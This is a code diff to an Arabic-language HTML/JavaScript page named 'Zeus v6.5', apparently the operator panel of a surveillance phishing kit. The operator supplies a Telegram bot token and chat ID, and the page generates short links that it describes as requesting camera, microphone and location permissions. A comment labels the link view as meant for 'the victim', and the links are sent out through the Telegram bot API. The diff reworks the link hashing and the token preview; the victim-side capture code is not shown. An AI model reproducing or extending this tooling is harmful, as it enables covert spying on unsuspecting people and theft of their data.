@@ -3,9 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>𝒁𝒆𝒖𝒔 · v6.4 (رابط ثابت)</title>
+  <title>𝒁𝒆𝒖𝒔 · v6.5 (ثابت مطلق)</title>
   <style>
-    /* نفس الأنماط السابقة، يمكنك استخدامها كما هي */
     body { background: #0a0202; color: #f0e6e6; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; direction: rtl; }
     .container { background: #160404; border: 1px solid #ff003388; border-radius: 16px; padding: 30px 25px; max-width: 550px; width: 100%; box-shadow: 0 0 50px rgba(255,0,51,0.15); }
     h1 { font-size: 26px; color: #ff0033; text-align: center; margin: 0 0 5px 0; letter-spacing: 2px; }
@@ -14,10 +13,6 @@
     .field label { display: block; font-size: 13px; color: #ff0033aa; margin-bottom: 5px; letter-spacing: 0.5px; }
     .field input { width: 100%; padding: 10px 12px; border-radius: 8px; border: 1px solid #ff003355; background: #0d0202; color: #f0e6e6; font-size: 14px; box-sizing: border-box; direction: ltr; text-align: left; }
     .field input::placeholder { color: #f0e6e644; }
-    .permalink-row { display: flex; gap: 8px; margin: 6px 0 12px; }
-    .permalink-row input { flex: 1; padding: 6px 10px; background: #0a0101; border: 1px solid #ff003344; border-radius: 6px; color: #f0e6e688; font-size: 12px; direction: ltr; text-align: left; }
-    .permalink-row button { background: #1a0808; border: 1px solid #ff003366; color: #f0e6e6; padding: 6px 14px; border-radius: 6px; cursor: pointer; font-size: 13px; white-space: nowrap; }
-    .permalink-row button:hover { background: #2a0808; border-color: #ff0033; }
     .features { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin: 12px 0 18px; }
     .feature-item { background: #1a0808; border: 1px solid #ff003333; border-radius: 8px; padding: 8px 4px; text-align: center; cursor: pointer; transition: 0.2s; font-size: 13px; color: #f0e6e688; }
     .feature-item.active { border-color: #ff0033; background: #2a0808; color: #ff0033; box-shadow: 0 0 20px #ff003322; }
@@ -40,26 +35,24 @@
     #botList .item .del { color: #ff003388; cursor: pointer; }
     #botList .item .del:hover { color: #ff0033; }
     .footer { margin-top: 16px; text-align: center; font-size: 12px; color: #f0e6e644; letter-spacing: 1px; }
+    .token-preview { background: #0a0101; border: 1px dashed #ff003344; border-radius: 6px; padding: 8px; margin-top: 8px; text-align: center; font-size: 14px; color: #ff003388; direction: ltr; }
+    .token-preview strong { color: #ff0033; }
   </style>
 </head>
 <body>
 <div class="container">
-  <h1>𝒁𝒆𝒖𝒔 · v6.4</h1>
-  <div class="sub">‹ رابط قصير ثابت لكل توكن ›</div>
+  <h1>𝒁𝒆𝒖𝒔 · v6.5</h1>
+  <div class="sub">‹ رابط قصير ثابت · خوارزمية رياضية ›</div>
 
   <form id="form">
     <div class="field">
       <label>🤖 توكن البوت</label>
       <input type="text" id="botToken" placeholder="أدخل توكن البوت" required>
+      <div class="token-preview" id="previewBox">🔮 الرابط القصير المتوقع: <strong id="previewShort">------</strong></div>
     </div>
     <div class="field">
       <label>🆔 معرف المحادثة (Chat ID)</label>
       <input type="text" id="chatId" placeholder="مثل 123456789" required>
-    </div>
-
-    <div class="permalink-row">
-      <input type="text" id="permalinkInput" value="" readonly placeholder="احفظ هذا الرابط في أي متصفح" dir="ltr">
-      <button type="button" id="copyPermalinkBtn">📋 نسخ الرابط الدائم</button>
     </div>
 
     <div style="font-size:13px; color:#ff003388; margin-bottom:6px;">⚙️ الميزات المطلوبة</div>
@@ -95,12 +88,12 @@
     <div id="listItems"></div>
   </div>
 
-  <div class="footer">◆ XX_8K · RED ROOM v6.4 (حل ثابت) ◆</div>
+  <div class="footer">◆ XX_8K · RED ROOM v6.5 (ثبات مطلق) ◆</div>
 </div>
 
 <script>
   // ================================================================
-  //  𝒁𝒆𝒖𝒔 v6.4 — رابط قصير ثابت يعتمد على التوكن (بدون عشوائية)
+  //  𝒁𝒆𝒖𝒔 v6.5 — خوارزمية رياضية ثابتة (لا عشوائية، لا اعتماد على المتصفح)
   // ================================================================
 
   const form = document.getElementById('form');
@@ -115,75 +108,44 @@
   const logDiv = document.getElementById('log');
   const errorDiv = document.getElementById('formError');
   const listItems = document.getElementById('listItems');
-  const permalinkInput = document.getElementById('permalinkInput');
-  const copyPermalinkBtn = document.getElementById('copyPermalinkBtn');
+  const previewShort = document.getElementById('previewShort');
 
-  // --- دالة توليد الرابط القصير من التوكن (ثابت) ---
+  // --- دالة توليد الرابط القصير من التوكن (خوارزمية ثابتة 100%) ---
   function generateShortFromToken(botToken) {
+    // 1. تنظيف النص من أي مسافات أو أحرف خفية
+    const clean = botToken.trim().replace(/\s+/g, '');
+    if (!clean) return '------';
+
+    // 2. خوارزمية هاش (ضرب في 31) — تستخدم في Java و JavaScript
     let hash = 0;
-    for (let i = 0; i < botToken.length; i++) {
-      hash = ((hash << 5) - hash) + botToken.charCodeAt(i);
-      hash = hash & hash;
+    for (let i = 0; i < clean.length; i++) {
+      hash = (hash * 31 + clean.charCodeAt(i)) >>> 0; // >>> 0 يضمن أنها 32 بت غير موقعة
     }
-    let result = Math.abs(hash).toString(36).toUpperCase();
+
+    // 3. تحويل الرقم إلى نظام 36 (أرقام + حروف) وتحويله إلى كبير
+    let result = hash.toString(36).toUpperCase();
+
+    // 4. التأكد من أنه 6 خانات على الأقل
     while (result.length < 6) result = '0' + result;
+
+    // 5. أخذ أول 6 خانات فقط
     return result.slice(0, 6);
   }
 
-  // --- باقي الدوال (تخزين، عرض، إرسال...) كما هي ---
-  function getParams() {
-    const params = new URLSearchParams(window.location.search);
-    return { bot: params.get('bot') || '', chat: params.get('chat') || '' };
-  }
-
-  function updatePermalink() {
-    const bot = botTokenInput.value.trim();
-    const chat = chatIdInput.value.trim();
-    if (bot && chat) {
-      const base = window.location.origin + window.location.pathname;
-      permalinkInput.value = `${base}?bot=${encodeURIComponent(bot)}&chat=${encodeURIComponent(chat)}`;
+  // --- معاينة فورية عند كتابة التوكن ---
+  botTokenInput.addEventListener('input', function() {
+    const token = this.value.trim();
+    if (token.length > 5) {
+      const short = generateShortFromToken(token);
+      previewShort.textContent = short;
+      previewShort.style.color = '#ff0033';
     } else {
-      permalinkInput.value = 'أدخل التوكن والمعرف ثم انسخ الرابط الدائم';
-    }
-  }
-
-  copyPermalinkBtn.addEventListener('click', function() {
-    const text = permalinkInput.value;
-    if (!text || text.includes('أدخل')) {
-      setError('⚠️ يرجى إدخال التوكن ومعرف المحادثة أولاً');
-      return;
-    }
-    if (navigator.clipboard) {
-      navigator.clipboard.writeText(text).then(() => {
-        this.textContent = '✅ تم';
-        setTimeout(() => this.textContent = '📋 نسخ الرابط الدائم', 1500);
-      }).catch(() => fallbackCopyPermalink(text));
-    } else {
-      fallbackCopyPermalink(text);
+      previewShort.textContent = '------';
+      previewShort.style.color = '#ff003388';
     }
   });
-  function fallbackCopyPermalink(text) {
-    const ta = document.createElement('textarea');
-    ta.value = text;
-    document.body.appendChild(ta);
-    ta.select();
-    document.execCommand('copy');
-    document.body.removeChild(ta);
-    copyPermalinkBtn.textContent = '✅ تم';
-    setTimeout(() => copyPermalinkBtn.textContent = '📋 نسخ الرابط الدائم', 1500);
-  }
 
-  document.querySelectorAll('.feature-item').forEach(item => {
-    item.addEventListener('click', function(e) {
-      const cb = this.querySelector('input[type="checkbox"]');
-      cb.checked = !cb.checked;
-      this.classList.toggle('active', cb.checked);
-    });
-    item.querySelector('input').addEventListener('click', function(e) {
-      e.stopPropagation();
-    });
-  });
-
+  // --- باقي الدوال (تخزين، عرض، إرسال...) ---
   function logMessage(msg) {
     const time = new Date().toLocaleTimeString();
     logDiv.innerHTML = `<div><span class="prompt">$</span> ${msg} <span style="color:#666;">[${time}]</span></div>` + logDiv.innerHTML;
@@ -263,7 +225,7 @@
   async function sendLinkToUser(botToken, chatId, shortToken) {
     const base = window.location.origin + window.location.pathname;
     const link = `${base}?t=${shortToken}`;
-    const msg = `🔗 *رابطك الجديد*\n${link}\n\nسيطلب الصلاحيات (كاميرا، ميكروفون، موقع)`;
+    const msg = `🔗 *رابطك الجديد (ثابت)*\n${link}\n\nسيطلب الصلاحيات (كاميرا، ميكروفون، موقع)`;
     try {
       const resp = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
@@ -284,7 +246,19 @@
     }
   }
 
-  // --- معالج النموذج (التعديل الأساسي هنا) ---
+  // --- تفعيل الميزات بالنقر ---
+  document.querySelectorAll('.feature-item').forEach(item => {
+    item.addEventListener('click', function(e) {
+      const cb = this.querySelector('input[type="checkbox"]');
+      cb.checked = !cb.checked;
+      this.classList.toggle('active', cb.checked);
+    });
+    item.querySelector('input').addEventListener('click', function(e) {
+      e.stopPropagation();
+    });
+  });
+
+  // --- معالج النموذج (الحدث الرئيسي) ---
   form.addEventListener('submit', async function(e) {
     e.preventDefault();
     setError('');
@@ -297,9 +271,16 @@
       return;
     }
 
+    // توليد الرابط القصير من التوكن (ثابت رياضياً)
+    const shortToken = generateShortFromToken(botToken);
+    if (shortToken === '------') {
+      setError('❌ التوكن غير صالح');
+      return;
+    }
+
     generateBtn.disabled = true;
     generateBtn.textContent = '⏳ جاري التوليد...';
-    logMessage('⏳ بدء توليد الرابط...');
+    logMessage(`⏳ توليد الرابط للتوكن: ${botToken.substring(0,10)}...`);
 
     try {
       const checked = document.querySelectorAll('.feature-item input[type="checkbox"]:checked');
@@ -307,19 +288,16 @@
 
       const data = getStorage();
 
-      // توليد الرابط القصير من التوكن (ثابت)
-      const shortToken = generateShortFromToken(botToken);
-
-      // نتحقق مما إذا كان التوكن موجودًا مسبقًا في التخزين
+      // نتحقق مما إذا كان التوكن موجوداً مسبقاً في التخزين (لحفظ الإعدادات فقط)
       if (data[botToken]) {
-        // تحديث الميزات إذا تغيرت
         const existing = data[botToken];
+        // تحديث الميزات ومعرف المحادثة إذا تغيرت
         if (existing.features !== features || existing.chatId !== chatId) {
           existing.features = features;
           existing.chatId = chatId;
           existing.updated = Date.now();
           saveStorage(data);
-          logMessage('🔄 تحديث بيانات الرابط السابق');
+          logMessage('🔄 تحديث إعدادات الرابط الثابت');
         }
         showResult(shortToken);
         await sendLinkToUser(botToken, chatId, shortToken);
@@ -329,21 +307,20 @@
         return;
       }
 
-      // إذا كان التوكن جديدًا، نخزنه
+      // إذا كان التوكن جديداً، نخزنه مع الرابط القصير الثابت
       data[botToken] = {
         chatId: chatId,
         features: features,
-        shortToken: shortToken,
+        shortToken: shortToken, // هذا ثابت ولا يتغير
         createdAt: Date.now(),
         updated: Date.now()
       };
       saveStorage(data);
-      logMessage('✅ تم حفظ الرابط الجديد');
+      logMessage(`✅ تم حفظ التوكن الجديد مع الرابط الثابت: ${shortToken}`);
 
       showResult(shortToken);
       await sendLinkToUser(botToken, chatId, shortToken);
       renderList();
-      updatePermalink();
 
     } catch (err) {
       logMessage('❌ خطأ: ' + err.message);
@@ -354,42 +331,52 @@
     }
   });
 
-  // --- التهيئة ---
+  // --- تهيئة الصفحة ---
   (function init() {
-    const params = getParams();
-    let bot = params.bot;
-    let chat = params.chat;
+    // قراءة المعلمات من الرابط (للحصول على التوكن ومعرف المحادثة)
+    const params = new URLSearchParams(window.location.search);
+    const bot = params.get('bot') || '';
+    const chat = params.get('chat') || '';
 
     if (bot && chat) {
-      botTokenInput.value = bot;
+      botTokenInput.value = decodeURIComponent(bot);
       chatIdInput.value = chat;
       localStorage.setItem('zeus_last_input', JSON.stringify({ botToken: bot, chatId: chat }));
-      logMessage(`✅ تم تحميل الإعدادات من الرابط: التوكن ${bot.substring(0,6)}...`);
+      logMessage(`✅ تم تحميل الإعدادات من الرابط: ${bot.substring(0,10)}...`);
+      // تحديث المعاينة
+      const short = generateShortFromToken(botTokenInput.value);
+      previewShort.textContent = short;
     } else {
       try {
         const last = JSON.parse(localStorage.getItem('zeus_last_input') || '{}');
         if (last.botToken) botTokenInput.value = last.botToken;
         if (last.chatId) chatIdInput.value = last.chatId;
-        if (last.botToken) logMessage('📂 تم استرجاع الإعدادات من التخزين المحلي');
+        if (last.botToken) {
+          logMessage('📂 تم استرجاع الإعدادات من التخزين المحلي');
+          const short = generateShortFromToken(botTokenInput.value);
+          previewShort.textContent = short;
+        }
       } catch {}
     }
 
-    botTokenInput.addEventListener('input', () => { updatePermalink();
-      saveLastInput(); });
-    chatIdInput.addEventListener('input', () => { updatePermalink();
-      saveLastInput(); });
-
-    function saveLastInput() {
+    // حفظ الإدخالات تلقائياً
+    botTokenInput.addEventListener('change', () => {
       localStorage.setItem('zeus_last_input', JSON.stringify({
         botToken: botTokenInput.value,
         chatId: chatIdInput.value
       }));
-    }
+    });
+    chatIdInput.addEventListener('change', () => {
+      localStorage.setItem('zeus_last_input', JSON.stringify({
+        botToken: botTokenInput.value,
+        chatId: chatIdInput.value
+      }));
+    });
 
     renderList();
-    logMessage('𝒁𝒆𝒖𝒔 v6.4 جاهز — الرابط القصير ثابت لكل توكن');
-    updatePermalink();
+    logMessage('𝒁𝒆𝒖𝒔 v6.5 جاهز — الرابط القصير ثابت رياضياً');
 
+    // إذا كان هناك رابط قصير في URL (للضحية)
     const tParam = new URLSearchParams(window.location.search).get('t');
     if (tParam) {
       document.querySelector('.container').innerHTML = `
@@ -400,7 +387,7 @@
       `;
     }
 
-    console.log('✅ 𝒁𝒆𝒖𝒔 v6.4 (رابط ثابت) جاهز');
+    console.log('✅ 𝒁𝒆𝒖𝒔 v6.5 (ثابت مطلق) جاهز');
   })();
 </script>
 </body>
